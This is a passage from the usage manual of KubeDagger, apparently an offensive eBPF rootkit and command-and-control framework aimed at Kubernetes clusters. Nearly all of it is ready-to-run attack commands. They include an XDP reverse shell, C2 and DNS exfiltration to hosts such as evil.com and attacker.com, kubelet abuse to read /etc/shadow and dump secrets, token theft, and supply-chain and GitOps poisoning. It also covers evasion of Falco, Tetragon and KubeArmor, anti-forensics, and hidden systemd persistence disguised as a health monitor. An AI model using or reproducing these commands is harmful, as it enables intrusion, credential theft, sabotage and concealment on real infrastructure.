kubedagger-client fileless-exec --payload "$(base64 /tmp/implant)" --name "[kworker/0:1]"

# Save execution report
kubedagger-client fileless-exec --payload "..." --name "[migration/0]" -o exec.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--payload` | (required) | Base64-encoded binary payload |
| `--name` | `[kworker/0:0]` | Fake process name for /proc/self/exe |
| `-o, --output` | stdout | Output file |

---

### 34. XDP Reverse Shell

Spawn a reverse shell triggered by crafted XDP magic packets.

```shell
# Connect back over ICMP
kubedagger-client xdp-shell --connect "10.0.2.5:4444" --protocol icmp

# UDP-based shell
kubedagger-client xdp-shell --connect "10.0.2.5:4444" --protocol udp

# Custom TCP
kubedagger-client xdp-shell --connect "10.0.2.5:4444" --protocol tcp-custom -o shell.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--connect` | (required) | Callback address `ip:port` |
| `--protocol` | `icmp` | Protocol: `icmp`, `udp`, or `tcp-custom` |
| `-o, --output` | stdout | Output file |

---

### 35. BPF Map IPC

Enable inter-program communication via BPF maps for coordinated operations.

```shell
# Send a message on a channel
kubedagger-client bpf-ipc --action send --channel "cmd" --message "execute"

# Receive from a channel
kubedagger-client bpf-ipc --action recv --channel "cmd"

# Save results
kubedagger-client bpf-ipc --action recv --channel "data" -o ipc.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `send` or `recv` |
| `--channel` | (required) | Channel identifier |
| `--message` | | Message to send (required for `send`) |
| `-o, --output` | stdout | Output file |

---

### 36. K8s Event C2

Use Kubernetes Event objects as a covert command-and-control channel.

```shell
# Start event-based C2 beacon
kubedagger-client k8s-event-c2 --namespace "kube-system" --beacon "30"

# Custom namespace
kubedagger-client k8s-event-c2 --namespace "default" --beacon "60" -o events.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--namespace` | `default` | Kubernetes namespace for events |
| `--beacon` | `30` | Beacon interval in seconds |
| `-o, --output` | stdout | Output file |

---

### 37. Container Log C2

Hide C2 data steganographically in container stdout/stderr logs.

```shell
# Base85 encoding in container logs
kubedagger-client container-log-c2 --container "webapp" --encode base85

# Whitespace steganography
kubedagger-client container-log-c2 --container "api-server" --encode whitespace

# Unicode encoding
kubedagger-client container-log-c2 --container "proxy" --encode unicode -o logc2.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--container` | (required) | Target container name |
| `--encode` | `base85` | Encoding: `base85`, `whitespace`, or `unicode` |
| `-o, --output` | stdout | Output file |

---

### 38. TCP Window Steganography

Encode covert data in TCP window size field via TC egress BPF — invisible to DPI.

```shell
# Send data with 2 bits per packet
kubedagger-client tcp-stego --data "secret payload" --dest "10.0.2.5:443" --bits-per-packet 2

# Higher throughput (4 bits)
kubedagger-client tcp-stego --data "more data" --dest "10.0.2.5:443" --bits-per-packet 4 -o stego.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--data` | (required) | Data to transmit covertly |
| `--dest` | (required) | Destination `ip:port` |
| `--bits-per-packet` | `2` | Bits encoded per packet: `2` or `4` |
| `-o, --output` | stdout | Output file |

---

### 39. DNS-over-HTTPS C2

Route C2 traffic through DoH providers to bypass DNS monitoring.

```shell
# Use Cloudflare DoH
kubedagger-client doh-c2 --resolver cloudflare --domain "c2.example.com"

# Use Google DoH
kubedagger-client doh-c2 --resolver google --domain "data.attacker.com"

# Custom resolver
kubedagger-client doh-c2 --resolver "https://custom.resolver/dns-query" --domain "cmd.evil.com" -o doh.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--resolver` | `cloudflare` | DoH resolver: `cloudflare`, `google`, or custom URL |
| `--domain` | (required) | C2 domain for TXT record queries |
| `-o, --output` | stdout | Output file |

---

### 40. Covert Channels

Use ICMP payload, IPv4 ID field, TCP urgent pointer, or IP TTL encoding for stealth communication.

```shell
# ICMP payload channel
kubedagger-client covert-channel --type icmp --dest "10.0.2.5" --data "command"

# IPv4 ID field encoding
kubedagger-client covert-channel --type ipid --dest "10.0.2.5" --data "exfil"

# TCP urgent pointer
kubedagger-client covert-channel --type urgent --dest "10.0.2.5:443" --data "payload"

# TTL encoding
kubedagger-client covert-channel --type ttl --dest "10.0.2.5" --data "secret" -o covert.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--type` | (required) | Channel type: `icmp`, `ipid`, `urgent`, or `ttl` |
| `--dest` | (required) | Destination IP (or `ip:port` for `urgent`) |
| `--data` | (required) | Data payload to transmit |
| `-o, --output` | stdout | Output file |

---

### 41. ARP Cache Poisoning

Inject gratuitous ARP replies via XDP to MITM pod-to-pod traffic in the cluster network.

```shell
# Poison ARP cache to intercept traffic
kubedagger-client arp-spoof --victim-ip "10.244.1.5" --gateway-ip "10.244.1.1" --interface eth0

# Save report
kubedagger-client arp-spoof --victim-ip "10.244.1.5" --gateway-ip "10.244.1.1" --interface cni0 -o arp.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--victim-ip` | (required) | IP of the pod to intercept |
| `--gateway-ip` | (required) | IP of the gateway to impersonate |
| `--interface` | (required) | Network interface for ARP injection |
| `-o, --output` | stdout | Output file |

---

### 42. Kubelet API Abuse

Connect to kubelet API (10250) using stolen node credentials to exec in pods and dump secrets.

```shell
# List pods on a node
kubedagger-client kubelet --action list --node "10.0.2.3"

# Execute command in a pod
kubedagger-client kubelet --action exec --node "10.0.2.3" --pod "webapp-abc123" --cmd "cat /etc/shadow"

# Dump secrets from a pod
kubedagger-client kubelet --action secrets --node "10.0.2.3" --pod "vault-0" -o secrets.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `list`, `exec`, or `secrets` |
| `--node` | (required) | Kubelet node IP |
| `--pod` | | Target pod name (required for `exec`/`secrets`) |
| `--cmd` | | Command to execute (required for `exec`) |
| `-o, --output` | stdout | Output file |

---

### 43. Veth Pair Hijacking

Attach TC BPF to veth pairs for transparent pod-to-pod traffic interception.

```shell
# Mirror traffic between pods
kubedagger-client veth-hijack --source-pod "frontend" --dest-pod "backend" --mode mirror

# Redirect traffic
kubedagger-client veth-hijack --source-pod "frontend" --dest-pod "attacker" --mode redirect

# Inject packets
kubedagger-client veth-hijack --source-pod "frontend" --dest-pod "backend" --mode inject -o veth.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--source-pod` | (required) | Source pod name |
| `--dest-pod` | (required) | Destination pod name |
| `--mode` | `mirror` | Mode: `mirror`, `redirect`, or `inject` |
| `-o, --output` | stdout | Output file |

---

### 44. Sidecar Container Injection

Use kubelet CRI API to inject containers directly into running pods, bypassing admission control.

```shell
# Inject a sidecar
kubedagger-client sidecar-inject --pod "webapp-abc123" --image "alpine:latest" --namespace "default"

# Inject into kube-system
kubedagger-client sidecar-inject --pod "coredns-xyz" --image "busybox" --namespace "kube-system" -o inject.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--pod` | (required) | Target pod name |
| `--image` | (required) | Container image to inject |
| `--namespace` | `default` | Pod namespace |
| `-o, --output` | stdout | Output file |

---

### 45. Supply Chain Injection

Perform OCI manifest manipulation and layer injection for container image supply chain attacks.

```shell
# Inject a malicious layer
kubedagger-client supply-chain --mode layer-inject --target-image "nginx:latest" --payload "/tmp/backdoor.tar"

# Replace entire manifest
kubedagger-client supply-chain --mode manifest-replace --target-image "webapp:v1" --payload "/tmp/evil-manifest.json"

# Save report
kubedagger-client supply-chain --mode layer-inject --target-image "api:v2" --payload "/tmp/implant.tar" -o supply.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | (required) | Attack mode: `layer-inject` or `manifest-replace` |
| `--target-image` | (required) | Target container image |
| `--payload` | (required) | Path to malicious payload/manifest |
| `-o, --output` | stdout | Output file |

---

### 46. GitOps Repository Poisoning

Target ArgoCD/Flux sync mechanisms to inject malicious manifests into GitOps repositories.

```shell
# Poison a manifest in a GitOps repo
kubedagger-client gitops-poison --repo "https://github.com/org/infra" --target-path "deployments/webapp.yaml" --inject-image "evil/webapp:latest"

# Save report
kubedagger-client gitops-poison --repo "https://github.com/org/infra" --target-path "apps/api.yaml" --inject-image "backdoor/api:v1" -o gitops.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--repo` | (required) | GitOps repository URL |
| `--target-path` | (required) | Path to manifest to modify |
| `--inject-image` | (required) | Malicious image to inject |
| `-o, --output` | stdout | Output file |

---

### 47. Service Account Token Minting

Mint or steal Kubernetes service account tokens with elevated permissions.

```shell
# Mint a new token
kubedagger-client sa-token --action mint --service-account "admin" --namespace "kube-system" --audience "https://kubernetes.default.svc"

# Steal existing token
kubedagger-client sa-token --action steal --service-account "default" --namespace "default"

# Save results
kubedagger-client sa-token --action mint --service-account "cluster-admin" --namespace "kube-system" -o token.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `mint` or `steal` |
| `--service-account` | (required) | Service account name |
| `--namespace` | `default` | Service account namespace |
| `--audience` | | Token audience (for `mint`) |
| `-o, --output` | stdout | Output file |

---

### 48. Pod Identity Theft

Steal projected SA tokens and spoof source IP to impersonate other pods.

```shell
# Steal pod identity
kubedagger-client pod-identity --target-pod "vault-0" --namespace "vault" --action steal

# Impersonate a pod
kubedagger-client pod-identity --target-pod "api-server-abc" --namespace "default" --action impersonate

# Save results
kubedagger-client pod-identity --target-pod "payment-svc" --namespace "prod" --action steal -o identity.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--target-pod` | (required) | Pod to impersonate |
| `--namespace` | `default` | Pod namespace |
| `--action` | (required) | `steal` or `impersonate` |
| `-o, --output` | stdout | Output file |

---

### 49. Image Signature Bypass

Bypass Sigstore/Cosign verification by injecting signatures or disabling admission validation.

```shell
# Inject a trusted signature
kubedagger-client sig-bypass --mode inject-sig --target-image "webapp:latest"

# Disable verification
kubedagger-client sig-bypass --mode disable-verify --target-image "api:v1"

# Save report
kubedagger-client sig-bypass --mode inject-sig --target-image "nginx:latest" -o sigbypass.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | (required) | Bypass mode: `inject-sig` or `disable-verify` |
| `--target-image` | (required) | Target image to bypass verification for |
| `-o, --output` | stdout | Output file |

---

### 50. CRD-Based Backdoor

Deploy a legitimate-looking CRD with a controller that executes rootkit commands on reconcile.

```shell
# Deploy CRD backdoor
kubedagger-client crd-backdoor --action deploy --crd-name "healthchecks.monitoring.k8s.io"

# Trigger execution
kubedagger-client crd-backdoor --action trigger --crd-name "healthchecks.monitoring.k8s.io"

# Remove backdoor
kubedagger-client crd-backdoor --action remove --crd-name "healthchecks.monitoring.k8s.io" -o crd.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--action` | (required) | `deploy`, `trigger`, or `remove` |
| `--crd-name` | (required) | CRD resource name |
| `-o, --output` | stdout | Output file |

---

### 51. Honeypot Detection

Fingerprint environment inconsistencies to detect honeypot or deception clusters.

```shell
# Run all detection checks
kubedagger-client honeypot-detect --checks all

# Specific checks only
kubedagger-client honeypot-detect --checks "kubelet,metrics,tokens"

# Save detection report
kubedagger-client honeypot-detect --checks all -o honeypot.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--checks` | `all` | Checks to run: `all`, `kubelet`, `metrics`, `tokens` |
| `-o, --output` | stdout | Output file |

---

### 52. Scheduler Starvation

Use eBPF kprobes on CFS scheduler to starve target pods of CPU time.

```shell
# Low intensity starvation
kubedagger-client sched-starve --target-cgroup "/kubepods/pod-abc123" --intensity low

# High intensity
kubedagger-client sched-starve --target-cgroup "/kubepods/burstable/pod-xyz" --intensity high

# Save report
kubedagger-client sched-starve --target-cgroup "/kubepods/pod-abc123" --intensity medium -o sched.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--target-cgroup` | (required) | Target pod's cgroup path |
| `--intensity` | `medium` | Starvation intensity: `low`, `medium`, or `high` |
| `-o, --output` | stdout | Output file |

---

### 53. Syscall Fault Injection

Use kretprobes to randomly return error codes from syscalls for target processes.

```shell
# Inject faults on read/write
kubedagger-client fault-inject --target-pids "1234" --syscalls "read,write" --error-rate 10 --errno 5

# Network faults
kubedagger-client fault-inject --target-pids "1234,5678" --syscalls "connect,accept" --error-rate 50 --errno 111

# Save report
kubedagger-client fault-inject --target-pids "1234" --syscalls "open,read" --error-rate 25 --errno 2 -o fault.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--target-pids` | (required) | Comma-separated target PIDs |
| `--syscalls` | (required) | Comma-separated syscalls to fault |
| `--error-rate` | `10` | Fault injection rate as percentage |
| `--errno` | `5` | Error code to return (e.g., 5=EIO, 2=ENOENT) |
| `-o, --output` | stdout | Output file |

---

### 54. Cgroup Resource Manipulation

Modify cgroup resource limits to cause OOM kills, CPU throttling, or freezing for target pods.

```shell
# Limit memory to trigger OOM
kubedagger-client cgroup-manip --target-pod "webapp" --resource memory --action limit

# Freeze a pod's cgroup
kubedagger-client cgroup-manip --target-pod "api-server" --resource cpu --action freeze

# Force OOM kill
kubedagger-client cgroup-manip --target-pod "database" --resource memory --action kill -o cgroup.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--target-pod` | (required) | Target pod name |
| `--resource` | (required) | Resource: `memory` or `cpu` |
| `--action` | (required) | Action: `limit`, `freeze`, or `kill` |
| `-o, --output` | stdout | Output file |

---

### 55. Leader Election Disruption

Manipulate Kubernetes Lease objects to disrupt controller leader election.

```shell
# Steal leadership
kubedagger-client election-disrupt --target scheduler --mode steal

# Deny election
kubedagger-client election-disrupt --target controller-manager --mode deny

# Oscillate leadership
kubedagger-client election-disrupt --target "custom-controller" --mode oscillate -o election.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--target` | (required) | Target: `scheduler`, `controller-manager`, or custom name |
| `--mode` | (required) | Disruption mode: `steal`, `deny`, or `oscillate` |
| `-o, --output` | stdout | Output file |

---

### 56. Certificate Rotation Sabotage

Intercept certificate rotation to inject attacker-controlled certs or force expiry.

```shell
# Inject attacker certificate
kubedagger-client cert-sabotage --mode inject --target kubelet

# Block certificate renewal
kubedagger-client cert-sabotage --mode block --target apiserver

# Force certificate expiry
kubedagger-client cert-sabotage --mode expire --target etcd -o cert.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | (required) | Sabotage mode: `inject`, `block`, or `expire` |
| `--target` | (required) | Target component: `kubelet`, `apiserver`, or `etcd` |
| `-o, --output` | stdout | Output file |

---

### 57. Kernel Keyring MITM

Intercept key_create_or_update to replace key material with attacker-controlled values.

```shell
# MITM user-type keys
kubedagger-client keyring-mitm --target-key-type user --replace-with "/tmp/attacker-key"

# MITM logon keys
kubedagger-client keyring-mitm --target-key-type logon --replace-with "/tmp/evil-key" -o mitm.json
```

**Flags:**
| Flag | Default | Description |
|------|---------|-------------|
| `--target-key-type` | (required) | Key type to intercept: `user`, `logon`, etc. |
| `--replace-with` | (required) | Path to attacker key material |
| `-o, --output` | stdout | Output file |

---

## HTTP/2 C2 Framework

The HTTP/2 C2 framework provides a cross-platform command-and-control infrastructure with mTLS transport, a task queue, and a module system. It runs independently of the eBPF components and supports Linux, Windows, and macOS targets.

### C2 Server

The server (`kubedagger-server`) listens for agent check-ins over HTTP/2 and exposes a management port for operator interaction.

```shell
# Development mode (no TLS)
./bin/kubedagger-server -key mypassphrase -plaintext

# Production mode (mTLS with auto-generated certs)
./bin/kubedagger-server -key $KEY

# Production mode (custom certs)
./bin/kubedagger-server -key $KEY -ca ca.pem -cert server.pem -key-file server-key.pem
```

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `-listen` | `0.0.0.0:443` | HTTP/2 listener address for agents |
| `-mgmt` | `127.0.0.1:9443` | Management port for operator CLI |
| `-key` | (required) | Encryption key (hex or passphrase) for management port |
| `-ca` | (auto-generate) | Path to CA cert PEM |
| `-cert` | (auto-generate) | Path to server cert PEM |
| `-key-file` | (auto-generate) | Path to server key PEM |
| `-plaintext` | `false` | Disable TLS (development only) |
| `-log-level` | `info` | Log level (debug, info, warn, error) |

**Protocol endpoints:**

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/checkin` | POST | Agent beacon (registers/updates heartbeat) |
| `/task` | POST | Agent polls for pending tasks |
| `/result` | POST | Agent submits task output |

### Agent

The agent (`kubedagger-agent`) is a cross-platform implant that beacons to the C2 server, executes tasks, and reports results.

```shell
# Development mode
./bin/kubedagger-agent-linux -server http://10.0.2.5:443 -plaintext

# Production mode (mTLS)
./bin/kubedagger-agent-linux -server https://c2.example.com:443 \
  -ca ca.pem -cert agent.pem -key agent-key.pem

# Custom agent ID
./bin/kubedagger-agent-linux -server https://c2.example.com:443 \
  -id node01-prod -ca ca.pem -cert agent.pem -key agent-key.pem
```

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `-server` | `https://127.0.0.1:443` | C2 server URL |
| `-id` | (auto-generated) | Agent identifier |
| `-ca` | (required for TLS) | Path to CA cert PEM for server verification |
| `-cert` | (required for TLS) | Path to agent client cert PEM |
| `-key` | (required for TLS) | Path to agent client key PEM |
| `-plaintext` | `false` | Disable TLS (development only) |
| `-log-level` | `info` | Log level |

**Agent behavior:**
- Beacon interval: 30 seconds (server-controlled)
- Jitter: ±20% randomization on sleep intervals
- Retry: exponential backoff on connection failure (max 5 retries)
- Auto-generated agent ID: 16-character hex string

### Operator CLI

The operator CLI (`kubedagger-operator`) connects to the server's management port to list agents, queue tasks, and retrieve results.

```shell
# List connected agents
./bin/kubedagger-operator -key $KEY agents

# Execute shell command
./bin/kubedagger-operator -key $KEY shell <agent-id> whoami

# Run a module
./bin/kubedagger-operator -key $KEY module <agent-id> k8s_discovery

# Run module with arguments
./bin/kubedagger-operator -key $KEY module <agent-id> dns_exfil domain=evil.com data=secret

# List tasks for an agent
./bin/kubedagger-operator -key $KEY tasks <agent-id>

# Get task output
./bin/kubedagger-operator -key $KEY status <task-id>
```

**Flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `-addr` | `127.0.0.1:9443` | Management server address |
| `-key` | (required) | Encryption key (must match server's `-key`) |
| `-log-level` | `warn` | Log level |

**Commands:**

| Command | Usage | Description |
|---------|-------|-------------|
| `agents` | `agents` | List connected agents with OS, arch, last seen |
| `shell` | `shell <agent-id> <command...>` | Queue a shell command on target agent |
| `module` | `module <agent-id> <name> [key=value...]` | Run a module with optional arguments |
| `tasks` | `tasks <agent-id>` | List all tasks for an agent |
| `status` | `status <task-id>` | Get detailed task status and output |

### Module System

Agents include a built-in module system for executing specialized techniques without requiring shell commands. Modules are platform-aware and will refuse to run on unsupported operating systems.

**Available modules:**

| Module | Platforms | Description |
|--------|-----------|-------------|
| `cloud_metadata` | linux, darwin | Query cloud provider metadata services (AWS, GCP, Azure) |
| `k8s_discovery` | linux, windows, darwin | Enumerate Kubernetes cluster resources via service account |
| `sa_token` | linux, windows, darwin | Read and decode Kubernetes service account tokens |
| `dns_exfil` | linux, windows, darwin | Exfiltrate data via DNS TXT queries |
| `honeypot_detect` | linux, windows, darwin | Detect honeypots and deception infrastructure |
| `covert_channel` | linux | Kernel-level covert channels (ICMP, DNS, TCP retransmit, TTL steganography) |
| `polymorph` | linux | eBPF bytecode polymorphism for signature evasion |
| `k8s_c2` | linux, windows, darwin | C2 communication via Kubernetes API (ConfigMap annotations) |
| `memexec` | linux | Memory-only execution and lateral movement (memfd, procmem, ptrace) |
| `webhook_deploy` | linux, windows, darwin | Deploy weaponized admission webhooks for Pod injection |
| `antiforensics` | linux | Anti-forensics eBPF hooks (audit suppression, log filtering, timestomping) |
| `autonomy` | linux, windows, darwin | Autonomous objective engine with rule-based forward-chaining planner |
| `multi_cluster` | linux, windows, darwin | Multi-cluster propagation via kubeconfig theft, federation, service mesh |
| `cloud_exploit` | linux, windows, darwin | Cloud provider exploitation (AWS, GCP, Azure IAM/metadata attacks) |
| `cicd_poison` | linux, windows, darwin | CI/CD pipeline poisoning (Tekton, ArgoCD, Flux task/app injection) |
| `service_mesh` | linux, windows, darwin | Service mesh deep attacks (Istio xDS injection, mTLS cert theft, traffic hijack) |
| `cloud_evasion` | linux, windows, darwin | Detection evasion (Falco, Tetragon, KubeArmor, Kubescape, Falco Talon, service mesh, cert-manager) |

**Module usage via operator:**

```shell
# Cloud metadata harvesting
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_metadata

# Kubernetes cluster discovery
./bin/kubedagger-operator -key $KEY module <agent-id> k8s_discovery

# Service account token extraction
./bin/kubedagger-operator -key $KEY module <agent-id> sa_token

# DNS exfiltration with custom domain
./bin/kubedagger-operator -key $KEY module <agent-id> dns_exfil domain=attacker.com data=sensitivedata

# Honeypot detection
./bin/kubedagger-operator -key $KEY module <agent-id> honeypot_detect

# Covert channel communication (ICMP, DNS, TCP retransmit, or TTL)
./bin/kubedagger-operator -key $KEY module <agent-id> covert_channel channel=icmp target=10.0.2.1 data=exfildata

# eBPF polymorphism (mutate loaded programs to evade signatures)
./bin/kubedagger-operator -key $KEY module <agent-id> polymorph program=network_probe

# K8s API C2 channel (use ConfigMap annotations for tasking)
./bin/kubedagger-operator -key $KEY module <agent-id> k8s_c2 namespace=default configmap=system-config

# Memory-only execution (fileless lateral movement)
./bin/kubedagger-operator -key $KEY module <agent-id> memexec method=memfd payload=/tmp/agent

# Deploy admission webhook (inject agent into new Pods)
./bin/kubedagger-operator -key $KEY module <agent-id> webhook_deploy namespace=default image=agent:latest

# Anti-forensics (suppress audit, filter logs, manipulate timestamps)
./bin/kubedagger-operator -key $KEY module <agent-id> antiforensics action=suppress_audit pid=1234

# Autonomous objective execution (goal-directed multi-step campaigns)
./bin/kubedagger-operator -key $KEY module <agent-id> autonomy objective=persist target=cluster

# Multi-cluster propagation (kubeconfig theft, federation abuse)
./bin/kubedagger-operator -key $KEY module <agent-id> multi_cluster action=discover
./bin/kubedagger-operator -key $KEY module <agent-id> multi_cluster action=pivot target=cluster-2

# Cloud provider exploitation (AWS/GCP/Azure IAM attacks)
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_exploit action=detect
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_exploit action=iam_escalate provider=aws

# CI/CD pipeline poisoning (Tekton, ArgoCD, Flux injection)
./bin/kubedagger-operator -key $KEY module <agent-id> cicd_poison action=detect
./bin/kubedagger-operator -key $KEY module <agent-id> cicd_poison action=inject platform=tekton namespace=tekton-pipelines

# Service mesh deep attacks (Istio/Envoy exploitation)
./bin/kubedagger-operator -key $KEY module <agent-id> service_mesh action=detect
./bin/kubedagger-operator -key $KEY module <agent-id> service_mesh action=xds_inject namespace=istio-system
./bin/kubedagger-operator -key $KEY module <agent-id> service_mesh action=certs namespace=istio-system
./bin/kubedagger-operator -key $KEY module <agent-id> service_mesh action=hijack source=frontend target=backend namespace=default

# Detection evasion (Falco, admission controllers, runtime detection)
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=detect
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=falco technique=symlink
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=admission technique=bypass_labels
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=runtime technique=fileless

# Tetragon evasion (io_uring bypass, policy gap analysis, ringbuf flood)
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=tetragon technique=io_uring
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=tetragon technique=policy_gaps
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=tetragon technique=ringbuf_flood
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=tetragon technique=disable_policy

# KubeArmor evasion (LSM policy audit, unconfined detection, policy manipulation)
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubearmor technique=policy_audit
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubearmor technique=unconfined
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubearmor technique=process_inject
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubearmor technique=allow_all

# Kubescape evasion (scan timing, label exclusion, disable scans)
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubescape technique=scan_timing
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubescape technique=label_exclusion
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubescape technique=disable_scans
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubescape technique=config_modify

# Falco Talon evasion (decoy, rule modification, saturation, response race)
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=talon technique=decoy
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=talon technique=rule_modify
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=talon technique=saturate
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=talon technique=response_race

# Service mesh security evasion (host network bypass, init race, iptables flush)
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=mesh_security technique=host_network
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=mesh_security technique=init_race
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=mesh_security technique=iptables_bypass
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=mesh_security technique=disable_injection

# cert-manager exploitation (enumerate, issue certs, steal CA, MITM prep)
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=enumerate
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=issue_cert
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=steal_ca
./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=mitm_prep
```

---

### Operator Web UI

KubeDagger includes a web-based operator dashboard for managing agents and dispatching commands without the CLI.

**Starting the Web UI:**

```shell
# Start with default address (:8080)
./bin/kubedagger-server -webui

# Or programmatically:
import "github.com/yasindce1998/KubeDagger/pkg/webui"

server := webui.NewServer(":8080", "my-secret-token")
server.Start(ctx)
```

**Features:**
- Real-time agent status cards with heartbeat tracking (active/stale)
- Command dispatch form with module/action/args inputs
- Command history with status badges (pending, dispatched, completed, failed)
- Auto-refresh agent list every 5 seconds
- Dark-themed responsive dashboard

**REST API endpoints:**

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Dashboard HTML page |
| `/api/agents` | GET | List all registered agents |
| `/api/agents/register` | POST | Register a new agent |
| `/api/commands` | GET | List all commands |
| `/api/commands/new` | POST | Create a new command |
| `/api/commands/poll?agent_id=X` | GET | Poll pending commands (updates agent heartbeat) |
| `/api/commands/result` | POST | Submit command result |

**Agent registration payload:**

```json
{
  "id": "agent-abc123",
  "hostname": "worker-1",
  "ip": "10.0.2.5",
  "os": "linux",
  "arch": "amd64",
  "cluster": "prod",
  "namespace": "default",
  "pod": "app-7f9b6c-x2k4l",
  "modules": ["k8s_discovery", "cloud_evasion", "service_mesh"]
}
```

**Command dispatch payload:**

```json
{
  "agent_id": "agent-abc123",
  "module": "cloud_evasion",
  "args": {"action": "detect"}
}
```

---

## Encrypted C2 Channel

An alternative to the HTTP-based C2 that uses ChaCha20-Poly1305 encryption over raw TCP. This is also used internally by the management port (operator CLI ↔ server).

### Server setup

```shell
# Generate a key
KEY=$(kubedagger-client c2 genkey)
echo $KEY

# Start server with encrypted C2
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY
```

### Client usage

```shell
# Connect via encrypted channel
kubedagger-client --encrypted --c2-key $KEY --target 10.0.2.5:9001 <command>
```

### Protocol details

- **Cipher:** ChaCha20-Poly1305 (AEAD)
- **Key:** 256-bit pre-shared key (64-char hex string)
- **Frame format:** `[4-byte length][12-byte nonce][ciphertext][16-byte auth tag]`
- **Heartbeat:** Empty encrypted message every 30 seconds
- **Max message:** 64KB

### Key generation

```shell
# Generate a random 256-bit key (hex encoded)
kubedagger-client c2 genkey
# Output: a]64-character hex string

# Or use any 64-char hex string
export C2_KEY="deadbeef..."
```

---

## Persistence

The persistence module ensures KubeDagger survives system reboots.

### Installation

```shell
# Enable persistence during startup
sudo ./bin/kubedagger -i eth0 -e eth0 --persist
```

### What it does

1. **Copies binary** to `/usr/lib/kubedagger/.kd`
2. **Hides the file** using eBPF-based file hiding (ext4)
3. **Installs systemd service** named `kube-health-monitor.service` (preferred)
4. **Falls back to cron** `@reboot` entry if systemd is unavailable

### Removal

```shell
# Remove persistence (run from a shell on the target)
sudo ./bin/kubedagger --remove-persist
```

This removes:
- The hidden binary
- The systemd service (or cron entry)
- The installation directory

---

## Multi-Node Coordination

When running KubeDagger on multiple nodes, they can share topology data.

### Setup

```shell
# Node 1
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY

# Node 2 (connects to Node 1 as peer)
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY \
  --peers 10.0.2.3:9001

# Node 3 (connects to both)
sudo ./bin/kubedagger -i eth0 -e eth0 --c2-port 9001 --c2-key $KEY \
  --peers 10.0.2.3:9001,10.0.2.4:9001
```

### How it works

- **Heartbeat** (every 30s): Nodes exchange alive status
- **Topology sync** (every 60s): Nodes share network flows and process data
- **Peer timeout** (90s): Peers marked dead if no heartbeat received
- **Merged view**: Any node can serve the combined topology from all peers

### Querying multi-node data

```shell
# Get merged network flows from all nodes
kubedagger-client network_discovery get --passive --all-nodes

# The dashboard shows data from all connected peers
kubedagger-client dashboard
```

---

## Example Workflow

A typical engagement workflow:

```shell
# 1. Deploy and start (with persistence)
